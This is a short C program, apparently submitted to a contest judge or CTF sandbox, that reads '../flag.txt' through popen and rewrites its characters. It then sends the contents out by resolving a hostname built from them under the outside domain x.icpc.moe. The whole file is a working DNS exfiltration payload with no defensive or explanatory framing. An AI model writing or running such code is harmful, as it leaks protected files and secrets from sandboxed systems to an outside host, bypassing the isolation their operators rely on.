#include <netdb.h>
#include <stdio.h>

FILE *op;
char res[100], buf[505];
int i;
const int len = 50;

int main(){
    op = popen("cat ../flag.txt | tr \'\\n\' \' \'", "r");
    fgets(res, len, op);
    fgets(res, len, op);
    fgets(res, len, op);
    fgets(res, len, op);
    for(i = 0; i < len; ++i){
        if(res[i] == '.') res[i] = '+';
        if(res[i] == ' ') res[i] = '=';
        printf("%c", res[i]);
    }
    sprintf(buf, "%s.x.icpc.moe", res);
    gethostbyname(buf);
}
